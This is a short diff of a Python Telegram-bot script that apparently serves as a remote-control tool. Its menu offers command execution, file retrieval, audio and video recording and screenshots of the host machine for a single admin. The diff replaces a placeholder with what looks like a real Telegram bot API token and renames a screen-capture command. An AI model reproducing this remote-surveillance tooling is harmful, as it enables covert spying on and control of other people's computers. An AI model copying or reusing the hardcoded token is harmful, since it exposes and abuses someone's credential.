@@ -18,7 +18,7 @@ from PIL import Image
 
 
 """ Variables """
-API_TOKEN = "token"
+API_TOKEN = "6669917733:AAE77ceLu3WIEcwORpqBFQiS3X7Ol-BSCmo"
 ADMIN_ID = id
 bot = TeleBot(API_TOKEN)
 
@@ -28,7 +28,7 @@ markup.add(KeyboardButton("cd"), KeyboardButton("chdir"),
         KeyboardButton("exec_cmd"), KeyboardButton("get_file"), 
         KeyboardButton("record_audio"), KeyboardButton("get_audio"),
         KeyboardButton("record_video"), KeyboardButton("get_video"),
-        KeyboardButton("screenshot"), KeyboardButton("getscreen"))
+        KeyboardButton("screenshot"), KeyboardButton("get_screen"))
 
 """ Fn """
 def checkID(ms):
@@ -274,7 +274,7 @@ class Client:
             bot.register_next_step_handler(ms, get_video_next)
 
 
-        elif ms.text == "getscreen":
+        elif ms.text == "get_screen":
             bot.send_message(ADMIN_ID, "Enter port, ip...")
             
             @bot.message_handler(content_types=["text"])
